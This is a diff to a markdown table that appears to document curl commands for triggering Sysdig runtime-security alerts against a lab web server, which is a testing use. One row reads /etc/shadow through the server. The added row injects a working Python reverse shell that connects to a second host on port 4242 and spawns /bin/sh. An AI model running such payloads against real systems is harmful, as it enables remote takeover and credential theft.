@@ -74,3 +74,4 @@ export WEBSERVERIP=192.168.1.15
 | Sysdig Event | Curl Command   |
 |---|---|
 | Read sensitive file untrusted | `curl http://$WEBSERVERIP/etc/shadow` |
+| Redirect STDOUT/STDIN to Network Connection in Container | `curl -X POST ${WEBSERVERIP}/exec -d command="python -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.3\",4242));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"` |
